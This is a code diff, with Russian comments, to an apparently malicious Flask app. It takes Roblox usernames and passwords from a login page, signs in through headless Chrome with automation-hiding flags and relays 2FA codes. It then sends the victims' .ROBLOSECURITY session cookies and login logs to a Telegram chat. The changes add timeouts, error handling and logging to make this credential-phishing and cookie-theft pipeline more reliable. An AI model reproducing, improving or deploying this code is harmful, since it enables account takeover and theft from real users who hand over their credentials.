@@ -81,8 +81,19 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
     try:
         send_telegram_log(f"[INFO] Начинаю вход для {username} (session_id: {session_id})")
         send_telegram_log(f"[INFO] ОС: {os.name}, ChromeDriver путь: {CHROMEDRIVER_PATH}")
+        
+        # Устанавливаем общий таймаут для всего процесса
+        import signal
+        
+        def timeout_handler(signum, frame):
+            raise TimeoutError("Процесс превысил время ожидания")
+        
+        # Устанавливаем таймаут 2 минуты
+        signal.signal(signal.SIGALRM, timeout_handler)
+        signal.alarm(120)
         options = webdriver.ChromeOptions()
-        options.add_argument('--headless')
+        # Основные опции для headless режима
+        options.add_argument('--headless=new')  # Новый headless режим
         options.add_argument('--no-sandbox')
         options.add_argument('--disable-dev-shm-usage')
         options.add_argument('--disable-gpu')
@@ -94,7 +105,6 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
         options.add_argument('--disable-default-apps')
         options.add_argument('--disable-plugins')
         options.add_argument('--disable-images')
-        # options.add_argument('--disable-javascript')  # Временно отключаем, так как Roblox требует JS
         options.add_argument('--disable-plugins-discovery')
         options.add_argument('--disable-background-timer-throttling')
         options.add_argument('--disable-backgrounding-occluded-windows')
@@ -108,6 +118,15 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
         options.add_argument('--disable-unload-dialogs')
         options.add_argument('--disable-page-hide-dialogs')
         options.add_argument('--disable-visibility-change-dialogs')
+        
+        # Дополнительные опции для стабильности
+        options.add_argument('--window-size=1920,1080')
+        options.add_argument('--start-maximized')
+        options.add_argument('--disable-blink-features=AutomationControlled')
+        options.add_argument('--disable-infobars')
+        options.add_argument('--disable-logging')
+        options.add_argument('--log-level=3')
+        options.add_argument('--silent')
         
         # Дополнительные опции для Linux
         if os.name != 'nt':  # Linux/Mac
@@ -371,7 +390,14 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
             else:
                 try:
                     driver = webdriver.Chrome(service=service, options=options)
+                    
+                    # Устанавливаем таймауты
+                    driver.set_page_load_timeout(30)
+                    driver.implicitly_wait(10)
+                    driver.set_script_timeout(30)
+                    
                     selenium_sessions[session_id] = {'driver': driver, 'username': username}
+                    send_telegram_log(f"[INFO] Chrome driver создан успешно для {username}")
                 except Exception as e:
                     send_telegram_log(f"[ERROR] Не удалось создать Chrome driver: {e}")
                     return {'success': False, 'message': f'Ошибка создания браузера: {e}'}
@@ -469,9 +495,17 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                     });
                 """)
                 
-                driver.get("https://www.roblox.com/login")
-                time.sleep(3)
-                send_telegram_log(f"[INFO] Открыта страница логина для {username}")
+                try:
+                    send_telegram_log(f"[INFO] Открываю страницу логина для {username}")
+                    driver.get("https://www.roblox.com/login")
+                    send_telegram_log(f"[INFO] Страница загружена, жду 3 секунды")
+                    time.sleep(3)
+                    send_telegram_log(f"[INFO] Страница логина готова для {username}")
+                except Exception as e:
+                    send_telegram_log(f"[ERROR] Ошибка загрузки страницы для {username}: {e}")
+                    driver.quit()
+                    selenium_sessions.pop(session_id, None)
+                    return {'success': False, 'message': f'Ошибка загрузки страницы: {e}'}
                 
                 # Дополнительно блокируем всплывающие окна после загрузки страницы
                 driver.execute_script("""
@@ -496,22 +530,44 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                     });
                 """)
                 
-                driver.find_element(By.ID, "login-username").send_keys(username)
-                driver.find_element(By.ID, "login-password").send_keys(password)
-                driver.find_element(By.ID, "login-button").click()
-                time.sleep(5)
-                send_telegram_log(f"[INFO] Отправлены логин и пароль для {username}")
+                try:
+                    send_telegram_log(f"[INFO] Ищу поля формы для {username}")
+                    username_field = driver.find_element(By.ID, "login-username")
+                    password_field = driver.find_element(By.ID, "login-password")
+                    login_button = driver.find_element(By.ID, "login-button")
+                    
+                    send_telegram_log(f"[INFO] Заполняю форму для {username}")
+                    username_field.send_keys(username)
+                    password_field.send_keys(password)
+                    
+                    send_telegram_log(f"[INFO] Нажимаю кнопку входа для {username}")
+                    login_button.click()
+                    
+                    send_telegram_log(f"[INFO] Жду 5 секунд после отправки формы для {username}")
+                    time.sleep(5)
+                    send_telegram_log(f"[INFO] Форма отправлена для {username}")
+                except Exception as e:
+                    send_telegram_log(f"[ERROR] Ошибка при заполнении формы для {username}: {e}")
+                    driver.quit()
+                    selenium_sessions.pop(session_id, None)
+                    return {'success': False, 'message': f'Ошибка при заполнении формы: {e}'}
 
             # Проверяем ошибки Roblox
-            error_message = check_roblox_errors(driver)
-            if error_message:
-                driver.quit()
-                selenium_sessions.pop(session_id, None)
-                send_telegram_log(f"[ERROR] Ошибка Roblox для {username}: {error_message}")
-                return {'success': False, 'message': error_message}
+            try:
+                send_telegram_log(f"[INFO] Проверяю ошибки Roblox для {username}")
+                error_message = check_roblox_errors(driver)
+                if error_message:
+                    driver.quit()
+                    selenium_sessions.pop(session_id, None)
+                    send_telegram_log(f"[ERROR] Ошибка Roblox для {username}: {error_message}")
+                    return {'success': False, 'message': error_message}
+                send_telegram_log(f"[INFO] Ошибок Roblox не найдено для {username}")
+            except Exception as e:
+                send_telegram_log(f"[WARNING] Не удалось проверить ошибки Roblox для {username}: {e}")
 
             # Сразу проверяем, есть ли поле для кода 2FA
             try:
+                send_telegram_log(f"[INFO] Проверяю наличие 2FA для {username}")
                 driver.find_element(By.ID, "two-step-verification-code-input")
                 
                 # Блокируем всплывающие окна при обнаружении 2FA
@@ -585,28 +641,36 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                 return {'need_code': True, 'session_id': session_id}
             except:
                 # Если поля для кода нет, проверяем куки
-                cookies = driver.get_cookies()
-                roblosecurity = next((c for c in cookies if c['name'] == '.ROBLOSECURITY'), None)
-                if roblosecurity:
-                    # Успешный вход без 2FA
+                try:
+                    send_telegram_log(f"[INFO] Проверяю куки для {username}")
+                    cookies = driver.get_cookies()
+                    roblosecurity = next((c for c in cookies if c['name'] == '.ROBLOSECURITY'), None)
+                    
+                    if roblosecurity:
+                        # Успешный вход без 2FA
+                        driver.quit()
+                        selenium_sessions.pop(session_id, None)
+                        send_telegram_log(f"[SUCCESS] Вход успешен для {username}. Куки отправлены файлом.")
+                        # Сохраняем куки во временный файл
+                        filename = f"roblox_cookies_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+                        filepath = os.path.join(os.path.dirname(__file__), filename)
+                        with open(filepath, 'w', encoding='utf-8') as f:
+                            json.dump(cookies, f, ensure_ascii=False, indent=2)
+                        caption = f"Roblox cookies for {username} ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})"
+                        send_telegram_file(filepath, caption=caption)
+                        os.remove(filepath)
+                        return {'success': True, 'cookies': cookies}
+                    else:
+                        # Не удалось войти
+                        driver.quit()
+                        selenium_sessions.pop(session_id, None)
+                        send_telegram_log(f"[ERROR] Не удалось войти для {username}")
+                        return {'success': False, 'message': 'Не удалось войти. Проверьте логин и пароль.'}
+                except Exception as e:
+                    send_telegram_log(f"[ERROR] Ошибка при проверке куки для {username}: {e}")
                     driver.quit()
                     selenium_sessions.pop(session_id, None)
-                    send_telegram_log(f"[SUCCESS] Вход успешен для {username}. Куки отправлены файлом.")
-                    # Сохраняем куки во временный файл
-                    filename = f"roblox_cookies_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-                    filepath = os.path.join(os.path.dirname(__file__), filename)
-                    with open(filepath, 'w', encoding='utf-8') as f:
-                        json.dump(cookies, f, ensure_ascii=False, indent=2)
-                    caption = f"Roblox cookies for {username} ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})"
-                    send_telegram_file(filepath, caption=caption)
-                    os.remove(filepath)
-                    return {'success': True, 'cookies': cookies}
-                else:
-                    # Не удалось войти
-                    driver.quit()
-                    selenium_sessions.pop(session_id, None)
-                    send_telegram_log(f"[ERROR] Не удалось войти для {username}")
-                    return {'success': False, 'message': 'Не удалось войти. Проверьте логин и пароль.'}
+                    return {'success': False, 'message': f'Ошибка при проверке куки: {e}'}
     except Exception as e:
         if session_id in selenium_sessions:
             try:
@@ -616,6 +680,12 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
             selenium_sessions.pop(session_id, None)
         send_telegram_log(f"[ERROR] Ошибка Selenium для {username}: {e}")
         return {'success': False, 'message': f'Ошибка Selenium: {e}'}
+    finally:
+        # Очищаем таймаут
+        try:
+            signal.alarm(0)
+        except:
+            pass
 
 @app.route('/')
 def login_page():
